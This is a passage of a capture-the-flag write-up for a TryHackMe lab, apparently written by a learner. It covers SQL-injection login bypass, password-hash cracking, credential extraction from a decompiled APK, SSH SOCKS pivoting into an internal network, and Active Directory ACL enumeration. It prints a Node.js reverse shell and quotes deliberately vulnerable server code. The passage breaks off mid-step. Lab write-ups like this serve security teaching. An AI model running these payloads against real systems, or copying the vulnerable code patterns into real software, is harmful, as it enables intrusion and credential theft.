---
Title: Dead Drop
Description: Every dead drop points inward. Chain your findings, pivot through the gaps, and follow the trail until nothing is out of reach.
Link: https://tryhackme.com/room/dead-drop
Topics: 
- SQL injection
- information disclosure
- password cracking
- APK reverse engineering
- credential reuse
- pivoting
- SOCKS tunneling
- Active Directory enumeration
- ACL abuse (AddMember)
- privilege escalation
Tools:
- nmap
- feroxbuster
- Burp Suite
- curl
- John the Ripper
- jadx
- ssh
- proxychains4
- xfreerdp
- PowerShell AD module
- BloodHound
THM Difficulty: Medium
THM Estimation: 90 minutes
---
#challenge
# Challenge
You have been engaged as a penetration tester for a security audit of **DeadDrop Ltd**, a document management company that provides file-sharing services to corporate clients. The company recently expanded its infrastructure and wants assurance that its systems are secure before onboarding a major new client.

Your point of entry is a web-facing file-sharing application. Behind it sits an internal corporate network that you have no direct access to. Your objective is clear: compromise the domain controller and retrieve the flag from the Administrator's desktop. How you get there is up to you.

## Scope and Rules of Engagement

The engagement covers the following systems:

| Machine          | Role                            | Access                                                   |
| ---------------- | ------------------------------- | -------------------------------------------------------- |
| DeadDrop-WEB     | DMZ web server                  | Directly accessible via your VPN connection              |
| Internal network | Corporate LAN (192.168.11.0/24) | Not directly accessible, must be reached through the DMZ |
The internal network contains a Windows workstation and a domain controller, but you will need to discover their exact addresses yourself.

**In scope:**
- All services running on the lab machines
- Any credentials or hashes you discover along the way
- Pivoting from the DMZ into the internal network
- Active Directory enumeration and ACL-based attacks

**Out of scope:**
- Denial of service attacks
- Social engineering of DeadDrop Ltd employees
- Modifying or deleting data on production systems

![[dead_drop_01.png]]

>[!Note] DEADDROP-WRK
>The 192.168.11.51 machine was not reachable, neither from the Webserver, nor from the DC. I am not sure what the purpose of this machine is, but it was not needed to find the answers to the challenges.
# Questions
- [[#Challenge 1 - What password grants you SSH access to the web server?|Challenge 1]] - What password grants you SSH access to the web server?
- [[#Challenge 2 - What credentials does the company's internal mobile application contain? (Format `username password`)|Challenge 2]] - What credentials does the company's internal mobile application contain? (Format: `username:password`)
- [[#Challenge 3 - What Active Directory permission does your domain account hold that can be abused for privilege escalation?|Challenge 3]] - What Active Directory permission does your domain account hold that can be abused for privilege escalation?
- [[#Challenge 4 - What is the name of the group you target to escalate to Domain Admin?|Challenge 4]] - What is the name of the group you target to escalate to Domain Admin?
- [[#Challenge 5 - What is the flag on the Domain Controller?|Challenge 5]] - What is the flag on the Domain Controller?
# Decoding the task
- "**engaged as a penetration tester**" - tells us what we need to do.
- "**provides file-sharing services to corporate clients**" - File sharing could be either through web, or a service (e.g., SMB).
- "**Your point of entry is a web-facing file-sharing application**" - We know the entry point and we're given 3 VMs as a start.
- "**Behind it sits an internal corporate network that you have no direct access to**" - there are other VMs that we need to pivot via the web server.
- "**compromise the domain controller and retrieve the flag from the Administrator's desktop**" - Quite clear objective. We have an AD to compromise

We've been given the scope which is crucial in pentesting activity.

>[!Note] Attackbox
>This write-up assumes the TryHackMe provided attackbox is used, and therefore, the tools and wordlists from the machine is used. Should you use your own attackbox, then you will need to source the tools and wordlists yourself.

# Initial recon

>[!Note] Concept
>Perform recon on the target IP, identify ports, OS, application logic, etc...

## Identify the entry point host
We're given 3 IP addresses and only one is reachable:

```bash
ping -c 1 192.168.11.100
PING 192.168.11.100 (192.168.11.100) 56(84) bytes of data.
^C
--- 192.168.11.100 ping statistics ---
1 packets transmitted, 0 received, 100% packet loss, time 0ms
```

```bash
ping -c 1 192.168.11.51 
PING 192.168.11.51 (192.168.11.51) 56(84) bytes of data.
^C
--- 192.168.11.51 ping statistics ---
1 packets transmitted, 0 received, 100% packet loss, time 0ms
```

```bash
ping -c 1 192.168.11.200
PING 192.168.11.200 (192.168.11.200) 56(84) bytes of data.
64 bytes from 192.168.11.200: icmp_seq=1 ttl=63 time=21.0 ms

--- 192.168.11.200 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 20.998/20.998/20.998/0.000 ms
```

Our entry point is `192.168.11.200` labeled as "**WebServer**".

| Host         | Role                  | Address          | Reach                                       |
| ------------ | --------------------- | ---------------- | ------------------------------------------- |
| WebServer    | DMZ (Linux/Express)   | `192.168.11.200` | direct via VPN                              |
| DEADDROP-DC  | Domain controller     | `192.168.11.100` | via the DMZ only                            |
| DEADDROP-WRK | Workstation (Windows) | `192.168.11.51`  | **unreachable in this room - not required** |
## Set the TARGET variable

>[!Tip] Setting a TARGET variable helps us so that we can use it later on, instead of typing the IP each time

```bash
# Set the target IP variable so we don't have to type it all the time
TARGET=192.168.11.200
```

## Identify accessible ports

```bash
nmap -sS -sV $TARGET
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-11-03 08:43 UTC
Nmap scan report for ip-192-168-11-200.eu-central-1.compute.internal (192.168.11.200)
Host is up (0.023s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Node.js Express framework
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.78 seconds
```

**Ports:**
- `22` - ssh -> OpenSSH 9.6p1 Ubuntu 3ubuntu13.5
- `80` - http -> **Node.js Express framework**

## Investigating the port `80`
We've identified from the `nmap` that port `80` is reachable. Let's investigate it further:

```bash
# Set the URL variable so we don't have to type it all the time
URL=http://192.168.11.200:80
```

**Checking the HTTP header only, looking for the HTTP response code**:

```http
curl -I $URL

HTTP/1.1 302 Found
X-Powered-By: Express
Location: /login
Vary: Accept
Content-Type: text/plain; charset=utf-8
Content-Length: 28
Date: Tue, 03 Nov 2026 08:48:50 GMT
Connection: keep-alive
Keep-Alive: timeout=5
```

Looks like a login page based on `Location: /login` header.

>[!Info] `robots.txt` and `sitemap.xml`
>It's a good practice to check for these two files. In this scenario, neither of these files are present. 
>`curl -I $URL/robots.txt`
>`curl -I $URL/sitemap.xml`

>[!Tip] Search for comments
>Use `curl -sSL $URL | grep -E '<!--|-->|/\*|\*/|(^|[^:])//|password'` to check a HTML page for HTML/JS comments for password keyword. Sometimes developers leave comments in the code that contain passwords/clues

## A look at the landing page

![[dead_drop_02.png]]

Using "Burp Suite", the `POST` request message reveals info: 

```http
POST /login HTTP/1.1
Host: 192.168.11.200
Content-Length: 29
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://192.168.11.200
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://192.168.11.200/login
Accept-Encoding: gzip, deflate, br
Connection: keep-alive

username=test&password=123456
```

- The method: `POST /login` 
- Header: `Content-Type: application/x-www-form-urlencoded`
- Payload: `username=test&password=123456`
- No "**CSRF token**" present -> no anti-CSRF token - the form isn’t CSRF-protected, though it’s not needed for this room.

The interesting part in the response is the `Invalid credentials`.  Why? This sort of error can tell us if we hit a valid username (i.e., the error message would be `Invalid password` instead of `invalid credentials`), or the application returns a generic error message making it harder for us to guess valid usernames.

```http
HTTP/1.1 200 OK
X-Powered-By: Express
Content-Type: text/html; charset=utf-8
Content-Length: 2124
ETag: W/"84c-qVFM6a+IurK/yMBZccWJx6JGqyo"
Date: Tue, 03 Nov 2026 09:09:37 GMT
Connection: keep-alive
Keep-Alive: timeout=5

    <p class="subtitle">Secure File Sharing Platform</p>
      <div class="error">Invalid credentials</div>
```

What can we do with this info? Brute force is one possibility. This is an expensive and noisy operation and we haven't got a username either so let's look for alternative methods at this stage:
- search for files/directories that may provide alternative method of access `dirb`, `gobuster` or `feroxbuster`.
- attempt a quick `SQLi`

>[!Note] Node.js
>The system is designed using `Node.js` and that's a different mechanism than the typical `apache` web server. `Node.js Express` defines routes in JavaScript, not files on disk, so directory brute-forcing behaves differently from an Apache/PHP target - expect route hits (`/login`, `/dashboard`) rather than file extensions. This information is important when running `dirb`, `gobuster` or `feroxbuster`.

# Finding the entry point
## Search for directories

**prepare the tool** (`feroxbuster` is used here):

```bash
#Create a directory to store the tool and the files
mkdir -p $HOME/challenge/feroxbuster

# Download and install the tool
curl -sL https://raw.githubusercontent.com/epi052/feroxbuster/main/install-nix.sh | bash -s $HOME/challenge/feroxbuster
```

**prepare the environment**:
The `$URL` has already been set. If not, set it:

```bash
# Ensure the $URL contains the correct value
echo $URL
http://192.168.11.200:80
```

**Set the `WORDLIST` we will use with the `feroxbuster`**: (Note about this wordlist: it is quite a large file and takes some time. This also means that it is quite noisy)

```bash
WORDLIST=/usr/share/wordlists/dirb/big.txt
```

**Run it**:

```bash
cd $HOME/challenge/feroxbuster

./feroxbuster -u $URL -w $WORDLIST  -d 3 -o challenge_site_scrap_1.txt
```

5 items are identified. None of them at this stage help us move forward.

```txt
302      GET        1l        4w       28c http://192.168.11.200/ => http://192.168.11.200/login
200      GET       40l      220w     2068c http://192.168.11.200/login
200      GET       40l      220w     2068c http://192.168.11.200/Login
302      GET        1l        4w       28c http://192.168.11.200/dashboard => http://192.168.11.200/login
302      GET        1l        4w       28c http://192.168.11.200/logout => http://192.168.11.200/login
```

The identified links are not useful. Let's try the next idea; SQLi.
## Attempting SQLi
Attempting to send a `'` as the login using the browser doesn't give us the effect, but it does give us a new error message. What the Burp Suite shows in the request:

- Typed `'` in the browser,
- The `POST` request shows `username=%27&password=123456`
- The response shows: `HTTP/1.1 200 OK` and the body:  `<div class="error">An error occurred</div>`

Using the Burp Suite Repeater to replace the `%27` with the actual `'` character, gives us the same error: `username='&password=123456` ->  `<div class="error">An error occurred</div>`. Let's try alternatives:

| What               | Outcome                            |
| ------------------ | ---------------------------------- |
| `'` (single quote) | `An error occurred`                |
| `"` (double quote) | `Invalid credentials`              |
| `;--`              | `Invalid credentials`              |
| `OR 1=1`           | `Invalid credentials`              |
| `' OR 1=1--`       | `Found. Redirecting to /dashboard` |
BINGO! we are in! Let's access it via the web. This reveals a classic string-concatenation injection.

![[dead_drop_03.png]]

**Observations**:
- we are logged in as "**admin**",
- There is a "**Upload file**" option,
- There are several files listed with interesting **extensions**: (`.js`, `.php`, `apk`, `.bak`),
- Each file has a **preview**, **delete** and **rename** button,
- from Burp Suite, we can see that we have a `Cookie: connect.sid=s%3AW0-YJQDLWZhj-lHSlrTUzSHHIuWjIAai.TxA9zhT3pEqqVYDCHyvVOgLOc7E43tZhKJwLeyrvklI`

>[!Note] signed Node.js / Express session cookie (`Cookie: connect.sid=`)
>- `s:` (`s%3A`) - indicates a signed value.
>- `W0-YJQDLWZhj-lHSlrTUzSHHIuWjIAai` - likely the session ID.
>- `.` - separates the value from its signature.
>- `TxA9zhT3pEqqVYDCHyvVOgLOc7E43tZhKJwLeyrvklI` - cryptographic signature.

## Viewing the files
### `shadow.bak`
- user `svc-drop`
- looks like a password hash -> crack it later

```bash
cat shadow.bak 
svc-drop:$6$f1331af25300c7f3$7twueSf8eUyvgYnPWElPYpspGgBuYJ.TMGrPZ2OBC6pGq18ZGkkPke9S0tRlQ3EpiRLWEqhgnqkh2BOHfdCCH0:19700:0:99999:7:::
```
### `passwd`
list of usernames.
- We can ignore the ones that have `/usr/sbin/nologin` at this stage -> no shell/console login possible with it.
- `svc-drop` and `root` have `/bin/bash`. We're interested in the `svc-drop` as login with `root` is most likely disabled.

```bash
cat passwd 
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:100:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
systemd-timesync:x:102:104:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:106::/nonexistent:/usr/sbin/nologin
syslog:x:104:110::/home/syslog:/usr/sbin/nologin
_apt:x:105:65534::/nonexistent:/usr/sbin/nologin
tss:x:106:111:TPM software stack,,,:/var/lib/tpm:/bin/false
uuidd:x:107:112::/run/uuidd:/usr/sbin/nologin
tcpdump:x:108:113::/nonexistent:/usr/sbin/nologin
sshd:x:109:65534::/run/sshd:/usr/sbin/nologin
landscape:x:110:115::/var/lib/landscape:/usr/sbin/nologin
pollinate:x:111:1::/var/cache/pollinate:/bin/false
ec2-instance-connect:x:112:65534::/nonexistent:/usr/sbin/nologin
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
ubuntu:x:1000:1000:Ubuntu:/home/ubuntu:/bin/bash
lxd:x:998:100::/var/snap/lxd/common/lxd:/bin/false
fwupd-refresh:x:113:119:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
dhcpcd:x:114:65534:DHCP Client Daemon,,,:/usr/lib/dhcpcd:/bin/false
polkitd:x:997:997:User for polkitd:/:/usr/sbin/nologin
node:x:996:996::/home/node:/usr/sbin/nologin
svc-drop:x:1001:1001::/home/svc-drop:/bin/bash
```
### `sh.php`

php-reverse-shell - A Reverse Shell implementation in PHP:

```bash
cat sh.php 
// php-reverse-shell - A Reverse Shell implementation in PHP. Comments stripped to slim it down. RE: https://raw.githubusercontent.com/pentestmonkey/php-reverse-shell/master/php-reverse-shell.php
// Copyright (C) 2007 pentestmonkey@pentestmonkey.net
<... remaining code removed ...>
```

There is an IP and port in the file which may come in handy later:

```
$ip = '10.113.79.122';
$port = 4445;
```
### `deaddrop.db`

It seems to contain username and password: `svc-backupBackupAgent2024�/<redacted>`. 

>[!Note] The credentials identified here were never used in solving the challenges in this room.

```bash
cat deaddrop.db 
��3��P++Ytablesqlite_sequencesqlite_sequenceCREATE TABLE sqlite_sequence(name,seq)�tableusersusersCREATE TABLE users (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT UNIQUE NOT NULL,
    password TEXT NOT NULL
���!+svc-backupBackupAgent2024�/<redacted>
���!svc-users
```

We have gathered enough information to start solving the challenges.

# Challenge 1 - What password grants you SSH access to the web server?
The challenge is asking us to find a password that will allow us to SSH to the web server. We have identified the `svc-drop` login that could be used to ssh from the `passwd` file we had downloaded from the dashboard. That's a good start.

>[!Note] For information purpose only
>The section [[#Pivot from the web server]] does not help solve the challenge. It provides a walkthrough describing the vulnerability available to open a reverse shell to the web server. It has been left here to demonstrate that this vulnerability is available, but requires further effort to use it. You may skip to the [[#Cracking the `svc-drop` user's password]] section.
## Pivot from the web server
We have access to the `dashboard` of the "DeadDrop", but we have no way to pivot. So we have solved the entry point challenge, and now, we need to pivot to the other devices. To achieve that, we have two options:
1. we need a shell on the web server.
2. find credentials to access via SSH.

## The file upload concept and reverse shell
There is a file upload option on the dashboard. This is a typical signature of uploading a file to trigger a reverse shell. 

![[dead_drop_10.png]]

There are already some example files. Previewing any `.js` file shows an empty page, even though the size of the file shows that it has some content. As an example, previewing the `shell.js` file:

![[dead_drop_06.png]]

![[dead_drop_07.png]]

However, when we rename the file and add an extension other than `.js`, for example `.temp`, then we are able to download the file and read the contents:

![[dead_drop_08.png]]

![[dead_drop_09.png]]

Here is the content:

```bash
cat shell.js.temp 
(function(){
    var net = require("net"),
        cp = require("child_process"),
        sh = cp.spawn("/bin/sh", []);
    var client = new net.Socket();
    client.connect(4444, "192.168.21.16", function(){
        client.pipe(sh.stdin);
        sh.stdout.pipe(client);
        sh.stderr.pipe(client);
    });
    return /a/; // Prevents the Node.js application form crashing
})();

```

This is a `js` reverse shell example. 

>[!Note] Note
>I was **not** able to get the reverse shell working. The final conclusion was that something on the network is blocking it.  After logging into the web server, I was able to verify from the code, that a vulnerability was placed on purpose inside the dashboard.

The SQLi vulnerability is evident in the `app.js` file once we login to the web server via SSH:

```js
// VULNERABLE: SQL injection via string concatenation (no parameterised query)
app.post('/login', (req, res) => {
  const { username, password } = req.body;

  // Intentionally vulnerable: raw string concatenation
  const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;

  try {
    const user = db.prepare(query).get();
    if (user) {
      req.session.user = { id: user.id, username: user.username };
      return res.redirect('/dashboard');
    }
    res.render('login', { error: 'Invalid credentials' });
  } catch (err) {
    res.render('login', { error: 'An error occurred' });
  }
});
```

This is the upload vulnerability code:

```js
const upload = multer({
  storage: storage,
  fileFilter: (req, file, cb) => {
    // VULNERABLE: Simple extension check that only looks at the final extension
    // A file named "shell.png.js" has extname ".js" and is blocked,
    // but "shell.js.png" has extname ".png" and passes the filter.
    // However, the preview route uses require() which needs .js extension.
    //
    // The real bypass: the filter blocks these exact extensions by simple match.
    // Double extensions like ".phtml" or non-standard extensions are not blocked.
    // A .js file renamed to .js.bak or uploaded with a null byte could bypass.
    //
    // Simplest bypass for this lab: the filter checks the last extension only.
    // Upload "shell.png" then use the rename feature to rename it to "shell.js"
    const blocked = ['.exe', '.bat', '.cmd', '.ps1', '.sh', '.py'];
    const ext = path.extname(file.originalname).toLowerCase();
    if (blocked.includes(ext)) {
      return cb(new Error('File type not allowed'), false);
    }
    cb(null, true);
  }
});
```

This is the `preview` code:

```js
// VULNERABLE: Preview route that require()'s .js files - gives RCE
app.get('/preview/:filename', requireAuth, (req, res) => {
  const filename = path.basename(req.params.filename);
  const filePath = path.join(__dirname, 'uploads', filename);

  if (!fs.existsSync(filePath)) {
    return res.status(404).send('File not found');
  }

  const ext = path.extname(filename).toLowerCase();

  // Text files: show content
  if (['.txt', '.md', '.csv', '.log', '.json', '.xml', '.yml', '.yaml'].includes(ext)) {
    const content = fs.readFileSync(filePath, 'utf8');
    return res.render('preview', { filename, content, type: 'text' });
  }

  // JavaScript files: "preview" by requiring them (INTENTIONALLY VULNERABLE)
  // This is the code execution vector. The app loads .js files to "preview"
  // their module exports, but this executes arbitrary code.
  if (ext === '.js') {
    try {
      // Clear require cache so re-uploads work
      delete require.cache[require.resolve(filePath)];
      const moduleExport = require(filePath);
      const content = typeof moduleExport === 'string'
        ? moduleExport
        : JSON.stringify(moduleExport, null, 2);
      return res.render('preview', { filename, content, type: 'text' });
    } catch (err) {
      return res.render('preview', {
        filename,
        content: `Error loading module: ${err.message}`,
        type: 'text'
      });
    }
  }

  // Other files: offer download
  res.download(filePath);
});
```

At this stage, since we have additional info, we can continue with the challenges.
## Cracking the `svc-drop` user's password
- The `passwd` file contains the details of the `svc-drop` user.
- The `shadow.bak` file contains the hash of the `svc-drop` user's password.

We can attempt to crack it using `john`:

```bash
# Extract the svc-drop user line from the passwd file
grep svc-drop passwd > passwd_file.txt

# unshadow the password hash of the user so we can use it with john
unshadow passwd_file.txt shadow.bak > svc-drop.pass.txt
```

```bash
# Set the rockyou.txt as the wordlist
WORDLIST=/usr/share/wordlists/rockyou.txt
```

```bash
# attempt to crack it
john -w $WORDLIST --format=sha512crypt svc-drop.pass.txt 
```

After 15 minutes or so, the password is cracked! BINGO!
open an SSH connection from the attack box to the web server:

```bash
ssh svc-drop@$TARGET
```

And we are in:

```bash
whoami
svc-drop

id
uid=1001(svc-drop) gid=1001(svc-drop) groups=1001(svc-drop)
```

Answer to the question: "What password grants you SSH access to the web server?" -> `drp......`

# Challenge 2 - What credentials does the company's internal mobile application contain? (Format: `username:password`)

The challenge is looking for credentials and it is giving us a hint that the info is stored inside the mobile application. There is an `apk` file listed on the dashboard.  Either download the `deaddrop-mobile.apk` manually from the dashboard by clicking on the preview button, or get the cookie value from the login request in the "Burp Suite" and then use `curl`:

>[!Note] The cookie used is specific to the session. Get the correct one from Burp Suite while attempting to execute the `curl` command below

```bash
curl -s -b "connect.sid=s%3AjA-TUkDVFa_dtBetNUB2enY-tLDSaVP1.Od0X83X5YsLt4hRRXJ6ZjU10QgcvY5kmM9n%2BrFopbkg" $URL/preview/deaddrop-mobile.apk -o deaddrop-mobile.apk
```

Decompile the file. The tool used here is `jadx`:

```bash
jadx -d output deaddrop-mobile.apk
```

Search through the files. The application specific files are under `/com` directory. Start from there. The details are in the file:

```bash
output/sources/com/deaddrop/mobile/Config.java 
```

```bash
cat Config.java 
package com.deaddrop.mobile;

/* loaded from: classes3.dex */
public final class Config {
    public static final String API_ENDPOINT = "http://internal.tryhackme.loc/api/v1";
    public static final String DEFAULT_PASSWORD = "<redacted>";
    public static final String DEFAULT_USERNAME = "<redacted>";
    public static final String ENVIRONMENT = "production";

    private Config() {
    }
}
```

BINGO! we have the answer. The fields: DEFAULT_USERNAME and DEFAULT_PASSWORD contain the details.

# Challenge 3 - What Active Directory permission does your domain account hold that can be abused for privilege escalation?
The challenge is asking us to find active directory permissions. This means:
- we need to first find a user who is in the active directory
- we need to find a method to retrieve the permissions of that user
- then we need to identify which permission can be used for privilege escalation

The positive part is that we already know the IP address of the active directory server: `192.168.11.100`, since it is given to us. See [[#Scope and Rules of Engagement]].

## Reachability check

According to the diagram given to us, the domain controller's IP address is: `192.168.11.100`. Can we reach it from the web server?

```bash
ping -c 1 192.168.11.100
PING 192.168.11.100 (192.168.11.100) 56(84) bytes of data.
64 bytes from 192.168.11.100: icmp_seq=1 ttl=128 time=0.340 ms

--- 192.168.11.100 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.340/0.340/0.340/0.000 ms
```

Yes. It is reachable. 

## Active Directory access

Is there a connection already open from the web server to the active directory? There seems to be a remote desktop connection. I am not sure why this is there. Could be a hint:

```bash
ss | grep 192.168.11.100
tcp   ESTAB  0      0                                              192.168.11.200:46984            192.168.11.100:ms-wbt-server            
```

**ms-wbt-server** is the IANA-assigned name for **Microsoft Terminal Services** or **Remote Desktop Protocol (RDP)** running on **port 3389** (TCP and UDP). 192.168.11.100 is the domain controller. 

Since we can't directly access the AD (VM3 here), we need to go through VM2 (the web server) and for that, we need SOCKS:

```
VM1 (Linux)                 VM2 (Linux)                VM3
+----------------+          +----------------+         +----------------+
|                |          |                |         |                |
| Your terminal  |  SSH     | SSH server     |         | Destination    |
|                |--------->|                |-------->| Server         |
| SOCKS client   |          | Network access |         |                |
|                |          |                |         |                |
+----------------+          +----------------+         +----------------+
```

- We'll use `proxychains`. We need to add our dynamic port to the `/etc/proxychains4.conf` file. On attack box - config (check, don't blind-append) - verify no stray socks4 9050 line. If there is already such a line, comment it out:

```bash
tail -5 /etc/proxychains4.conf      # verify no stray socks4 9050 line
sudo sed -i 's/^socks4.*9050/#&/' /etc/proxychains4.conf # comment it if present
```

- Add to proxy chains (on attack box). Make sure the port being added is not already used. In this example, it is `1080`:

```bash
echo "socks5 127.0.0.1 1080" | sudo tee -a /etc/proxychains4.conf
```

Ensure if there are other similar lines, they are commented out. The `[ProxyList]` should end up with **one** proxy line: (see the first bullet point above):

```bash
socks5 127.0.0.1 1080
```

- Start ssh (from attack box to target) and leave it running

```bash
ssh -N -D 1080 svc-drop@$TARGET
```

- On attack box - in another terminal, confirm tunnel is listening 

```bash
ss -lntp | grep 1080
```

- Store the DC IP into a variable so we don't have to type it all the time

```bash
DC=192.168.11.100
```
- On attack box , using a new terminal, test if the connection is working

```bash
proxychains4 nc -vz $DC 3389
```

On attack box start an RDP connection to the domain controller (192.168.11.100):

```
proxychains4 xfreerdp /dynamic-resolution +clipboard /cert:ignore /v:$DC /u:<redacted> /p:'<redacted>'
```

Which credentials? The ones found in challenge 2 - from the `apk` file. why? Credentials re-use is a common activity.

>[!Note] Lucky guess?
>Credentials re-use is a common activity. We had already identified another one as well in the [[#`deaddrop.db`]] file. Should this have not worked, then we would need to dig the web server for stored credentials, or look at the open remote desktop connection from the web server. It may have had the credentials in the command history, or use process explorer to see what command was executed, which could contain the credentials. 

BINGO! we have remote access to the active directory. But we're not there yet and there is still work to do.

![[dead_drop_05.png]]

## Identify privileges

`whoami /all` gives all the details. Let's start here:

```cmd
C:\Users\<redacted>>whoami /all

USER INFORMATION
----------------

User Name         SID
================= ============================================
deaddrop\<redacted> S-1-5-21-2304234032-2319324522-87291130-1103


GROUP INFORMATION
-----------------

Group Name                                      Type             SID                                         Attributes 
=============================================== ================ =========================================== ===============================================================
Everyone                                        Well-known group S-1-1-0                                     Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                                   Alias            S-1-5-32-545                                Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access      Alias            S-1-5-32-554                                Group used for deny only
BUILTIN\Administrators                          Alias            S-1-5-32-544                                Group used for deny only
NT AUTHORITY\REMOTE INTERACTIVE LOGON           Well-known group S-1-5-14                                    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\INTERACTIVE                        Well-known group S-1-5-4                                     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users                Well-known group S-1-5-11                                    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization                  Well-known group S-1-5-15                                    Mandatory group, Enabled by default, Enabled group
LOCAL                                           Well-known group S-1-2-0                                     Mandatory group, Enabled by default, Enabled group
DEADDROP\Domain Admins                          Group            S-1-5-21-2304234032-2319324522-87291130-512 Group used for deny only
Authentication authority asserted identity      Well-known group S-1-18-1                                    Mandatory group, Enabled by default, Enabled group
DEADDROP\Denied RODC Password Replication Group Alias            S-1-5-21-2304234032-2319324522-87291130-572 Mandatory group, Enabled by default, Enabled group, Local Group
Mandatory Label\Medium Mandatory Level          Label            S-1-16-8192                                            


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeMachineAccountPrivilege     Add workstations to domain     Disabled
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled


USER CLAIMS INFORMATION
-----------------------

User claims unknown.

Kerberos support for Dynamic Access Control on this device has been disabled.                             
```

The answer the challenge is looking for is not in the above command. Let's try `powershell`:

```powershell
# Pull your SID once
$me = (Get-ADUser <redacted>).SID.Value

# Walk every object, find ACEs where <redacted> is the trustee
Get-ADObject -Filter * -Properties nTSecurityDescriptor | ForEach-Object {
    $dn = $_.DistinguishedName
    $_.nTSecurityDescriptor.Access | Where-Object {
        $_.IdentityReference -match '<redacted>' -or $_.IdentityReference.Value -eq $me
    } | ForEach-Object {
        [pscustomobject]@{ Target = $dn; Right = $_.ActiveDirectoryRights; ObjectType = $_.ObjectType }
    }
}
```

```
Target                                                              Right ObjectType
------                                                              ----- ----------
CN=AdminSDHolder,CN=System,DC=deaddrop,DC=loc               WriteProperty bf9679c0-0de6-11d0-a285-00aa003049e2
CN=Administrator,CN=Users,DC=deaddrop,DC=loc                WriteProperty bf9679c0-0de6-11d0-a285-00aa003049e2
CN=Administrators,CN=Builtin,DC=deaddrop,DC=loc             WriteProperty bf9679c0-0de6-11d0-a285-00aa003049e2
CN=Print Operators,CN=Builtin,DC=deaddrop,DC=loc            WriteProperty bf9679c0-0de6-11d0-a285-00aa003049e2
CN=Backup Operators,CN=Builtin,DC=deaddrop,DC=loc           WriteProperty bf9679c0-0de6-11d0-a285-00aa003049e2
CN=Replicator,CN=Builtin,DC=deaddrop,DC=loc                 WriteProperty bf9679c0-0de6-11d0-a285-00aa003049e2
CN=krbtgt,CN=Users,DC=deaddrop,DC=loc                       WriteProperty bf9679c0-0de6-11d0-a285-00aa003049e2
CN=Domain Controllers,CN=Users,DC=deaddrop,DC=loc           WriteProperty bf9679c0-0de6-11d0-a285-00aa003049e2
CN=Schema Admins,CN=Users,DC=deaddrop,DC=loc                WriteProperty bf9679c0-0de6-11d0-a285-00aa003049e2
CN=Enterprise Admins,CN=Users,DC=deaddrop,DC=loc            WriteProperty bf9679c0-0de6-11d0-a285-00aa003049e2
CN=<redacted>,CN=Users,DC=deaddrop,DC=loc                   WriteProperty bf9679c0-0de6-11d0-a285-00aa003049e2
CN=Server Operators,CN=Builtin,DC=deaddrop,DC=loc           WriteProperty bf9679c0-0de6-11d0-a285-00aa003049e2
CN=Account Operators,CN=Builtin,DC=deaddrop,DC=loc          WriteProperty bf9679c0-0de6-11d0-a285-00aa003049e2
CN=Read-only Domain Controllers,CN=Users,DC=deaddrop,DC=loc WriteProperty bf9679c0-0de6-11d0-a285-00aa003049e2
CN=Key Admins,CN=Users,DC=deaddrop,DC=loc                   WriteProperty bf9679c0-0de6-11d0-a285-00aa003049e2
CN=Enterprise Key Admins,CN=Users,DC=deaddrop,DC=loc        WriteProperty bf9679c0-0de6-11d0-a285-00aa003049e2
CN=<redacted>,CN=Users,DC=deaddrop,DC=loc                   WriteProperty bf9679c0-0de6-11d0-a285-00aa003049e2
CN=<redacted>,CN=Users,DC=deaddrop,DC=loc             WriteProperty bf9679c0-0de6-11d0-a285-00aa003049e2

```

A quick check for a specific group:
